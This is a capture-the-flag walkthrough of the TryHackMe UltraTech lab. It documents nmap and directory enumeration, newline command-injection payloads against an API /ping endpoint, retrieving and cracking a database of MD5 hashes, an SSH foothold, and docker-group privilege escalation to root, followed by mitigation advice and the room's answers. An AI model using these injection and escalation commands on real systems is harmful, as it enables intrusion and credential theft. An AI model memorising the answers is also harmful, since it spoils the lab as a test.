# UltraTech CTF Walkthrough

**Target:** UltraTech  
**Source:** [TryHackMe](https://tryhackme.com/room/ultratech1)  
**Difficulty:** Medium  
**Target IP:** 10.114.177.92

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [API Analysis](#api-analysis)
- [OS Command Injection](#os-command-injection)
- [Database Exfiltration & Hash Cracking](#database-exfiltration--hash-cracking)
- [SSH Foothold](#ssh-foothold)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

UltraTech is a medium Linux box modelled on real-world misconfigurations. The
assessment is grey-box: only the company name and server IP are provided. The
attack chain runs from service enumeration that uncovers a Node.js Express REST
API, abuse of an **OS command injection** flaw in the API's `/ping` endpoint to
read a SQLite database, cracking the leaked MD5 password hashes, SSH access as a
low-privileged user, and finally privilege escalation via membership of the
**docker** group (a GTFOBins technique) to reach root.

**Key Skills Required:**
- Network scanning and service enumeration
- Web and API route discovery
- JavaScript source review for API behaviour
- OS command injection exploitation
- Database exfiltration and MD5 hash cracking
- SSH access with recovered credentials
- Linux privilege escalation via the `docker` group (GTFOBins)

---

## Reconnaissance

### Network Scanning

```bash
nmap 10.114.177.92
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 3.0.5 |
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 8081/tcp | http | Node.js Express framework |
| 31331/tcp | http | Apache httpd 2.4.41 (Ubuntu) |

An initial quick scan only shows ports 21 and 22, so a full port scan with
service detection is required to reveal the two HTTP services on non-standard
ports:

```bash
nmap -sV -sS -Pn -O -T4 -p- 10.114.177.92
```

```
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

A targeted aggressive scan confirms the services and titles:

```bash
nmap -O -A -Pn -T4 -p21,22,8081,31331 10.114.177.92
```

```
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
```

The standout services are the **Node.js API on 8081** and the **Apache site on
31331** — both on non-standard ports, and the Node.js API is the real attack
surface.

> **Q1 — Which software is using port 8081?** → `node.js`
> **Q2 — Which other non-standard port is used?** → `31331`
> **Q3 — Which software is using that port?** → `Apache`
> **Q4 — Which GNU/Linux distribution seems to be used?** → `Ubuntu`

---

## Web Enumeration

### Directory Brute Force — Apache (31331)

```bash
gobuster dir -u http://10.114.177.92:31331/ -w /usr/share/wordlists/dirb/common.txt
```

```
css                  (Status: 301)
images               (Status: 301)
index.html           (Status: 200)
javascript           (Status: 301)
js                   (Status: 301)
robots.txt           (Status: 200)
server-status        (Status: 403)
```

`robots.txt` points to a sitemap, which lists the site's static pages:

```bash
curl http://10.114.177.92:31331/robots.txt
```

```
Sitemap: /utech_sitemap.txt
```

```bash
curl http://10.114.177.92:31331/utech_sitemap.txt
```

```
/
/index.html
/what.html
/partners.html
```

### JavaScript Review

The `/js/` directory exposes `api.js`, which documents how the front-end talks
to the API on port 8081:

```bash
curl http://10.114.177.92:31331/js/api.js
```

```javascript
function getAPIURL() {
    return `${window.location.hostname}:8081`
}
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
form.action = `http://${getAPIURL()}/auth`;
```

This reveals two API routes — `/ping` (takes an `ip` parameter) and `/auth` —
and that the `ip` value is passed straight into a ping command.

---

## API Analysis

### Route Discovery — Node.js API (8081)

```bash
dirb http://10.114.177.92:8081/
```

```
+ http://10.114.177.92:8081/auth (CODE:200|SIZE:39)
+ http://10.114.177.92:8081/ping (CODE:500|SIZE:1094)
```

Probing the routes directly:

```bash
curl http://10.114.177.92:8081/
# UltraTech API v0.1.3

curl http://10.114.177.92:8081/auth
# You must specify a login and a password

curl http://10.114.177.92:8081/ping
# TypeError: Cannot read property 'replace' of undefined
#   at app.get (/home/www/api/index.js:45:29)
```

The `/ping` error leaks the API source path (`/home/www/api/index.js`) and shows
the endpoint expects an `ip` parameter.

> **Q5 — How many of the API's routes are used by the web application?** → `2`

---

## OS Command Injection

The `/ping` endpoint feeds the `ip` parameter into a shell `ping` command without
sanitisation. A URL-encoded newline (`%0A`) injects an arbitrary command after
the ping:

```bash
curl http://10.114.177.92:8081/ping?ip=10.114.177.92%0Apwd
```

```
PING 10.114.177.92 ...
/home/www/api
```

Listing the API working directory exposes a SQLite database:

```bash
curl http://10.114.177.92:8081/ping?ip=10.114.177.92%0Als+-la
```

```
-rw-r--r--   1 www www  1750 Mar 22  2019 index.js
-rw-r--r--   1 www www  8192 Mar 22  2019 utech.db.sqlite
```

> **Q6 — There is a database lying around, what is the filename?** → `utech.db.sqlite`

---

## Database Exfiltration & Hash Cracking

The database is exfiltrated through the same injection by `cat`-ing it and saving
the output locally:

```bash
curl --output utech.db.sqlite "http://10.114.177.92:8081/ping?ip=10.114.177.92%0Acat+utech.db.sqlite"
cat utech.db.sqlite
```

```
CREATE TABLE users (login Varchar, password Varchar, type Int)
r00t   f357a0c52799563c7c7b76c1e7543a32
admin  0d0ea5111e3c1def594c1684e3b9be84
```

> **Q7 — First user's password hash?** → `f357a0c52799563c7c7b76c1e7543a32`

Both hashes are unsalted MD5 and crack instantly (e.g. via
[CrackStation](https://crackstation.net) or `hashcat -m 0`):

| User | Hash | Type | Password |
|------|------|------|----------|
| r00t | `f357a0c52799563c7c7b76c1e7543a32` | md5 | `n100906` |
| admin | `0d0ea5111e3c1def594c1684e3b9be84` | md5 | `mrsheafy` |

> **Q8 — Password associated with the first hash?** → `n100906`

> **Recovered credentials:** `r00t : n100906` and `admin : mrsheafy`

---

## SSH Foothold

The `r00t` credentials authenticate over SSH:

```bash
ssh r00t@10.114.177.92
```

```
r00t@ip-10-114-177-92:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

> **Foothold:** `r00t`

The critical detail is group membership: `r00t` belongs to the **docker** group.

---

## Privilege Escalation

Members of the `docker` group can mount the host filesystem inside a container
and run commands as root ([GTFOBins](https://gtfobins.github.io/gtfobins/docker/)).
Mounting `/` into a throwaway container and `chroot`-ing into it gives a root
shell:

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh
```

```
# whoami
root
```

With root, the root user's home (including the SSH private key) is fully
readable:

```bash
# cd /root/.ssh && cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBA...
-----END RSA PRIVATE KEY-----
```

> **Q9 — First 9 characters of the root user's private SSH key?** → `MIIEogIBA`

The `private.txt` file and root's SSH key confirm complete system compromise.

---

## Flags

| Item | Value | Location |
|------|-------|----------|
| First hash answer | `f357a0c52799563c7c7b76c1e7543a32` | `utech.db.sqlite` |
| Cracked password | `n100906` | (r00t) |
| Root key prefix | `MIIEogIBA` | `/root/.ssh/id_rsa` |

---

## Vulnerabilities

### 1. OS Command Injection in `/ping` Endpoint (Critical)

**Description:** The Node.js API's `/ping` route passed the user-supplied `ip`
parameter directly into a shell command without validation, allowing arbitrary
command execution via a newline (`%0A`) injection.

**Impact:** Remote, unauthenticated command execution as the `www` user, leading
to exfiltration of the application's SQLite database.

**Mitigation:**
- Never pass user input to a shell; use safe APIs or a strict allow-list.
- Validate the `ip` parameter against a strict IP-address regex.
- Run the API under a least-privilege account.

### 2. Weak / Unsalted Password Hashes (High)

**Description:** User credentials were stored as plain, unsalted MD5 hashes in
`utech.db.sqlite`, which were cracked instantly with public rainbow tables.

**Impact:** Recovery of valid SSH credentials (`r00t:n100906`), enabling an
interactive foothold on the host.

**Mitigation:**
- Use a modern, salted, slow password hash (bcrypt, scrypt, Argon2).
- Restrict database file permissions and keep it out of web-readable paths.

### 3. Sensitive Database in Web-Accessible Directory (Medium)

**Description:** The SQLite database lived in the API's working directory
(`/home/www/api`) and was retrievable through the command-injection flaw.

**Impact:** Direct disclosure of all stored user credentials.

**Mitigation:**
- Store databases outside application and web-serving directories.
- Apply least-privilege file permissions on data stores.

### 4. Privilege Escalation via `docker` Group (Critical)

**Description:** The `r00t` user belonged to the `docker` group, which is
effectively equivalent to root. Mounting the host filesystem into a container
yields full root access.

**Impact:** Full privilege escalation from `r00t` to `root`.

**Mitigation:**
- Treat `docker` group membership as root-equivalent; grant it only to trusted
  administrators.
- Use rootless Docker or restrict the Docker socket where possible.

---

## Attack Chain Summary

```
Nmap scan → ports 21, 22, 8081 (Node.js), 31331 (Apache)
    ↓
Apache 31331 → robots.txt / sitemap / js/api.js reveals API on 8081
    ↓
Node.js API 8081 → routes /auth and /ping (ip parameter)
    ↓
/ping?ip=...%0A<cmd> → OS command injection (RCE as www)
    ↓
ls /home/www/api → utech.db.sqlite
    ↓
cat utech.db.sqlite → MD5 hashes (r00t, admin)
    ↓
Crack MD5 → r00t : n100906
    ↓
SSH foothold as r00t (member of docker group)
    ↓
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh → root shell
    ↓
Read /root/.ssh/id_rsa (MIIEogIBA...)
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| Gobuster / dirb | Web and API route enumeration |
| curl | API probing and command-injection exploitation |
| CrackStation / hashcat | MD5 hash cracking |
| ssh | Remote access |
| docker | Privilege escalation (GTFOBins) |

---

## References

- [TryHackMe — UltraTech](https://tryhackme.com/room/ultratech1)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [GTFOBins — docker](https://gtfobins.github.io/gtfobins/docker/)
- [CrackStation](https://crackstation.net/)

---
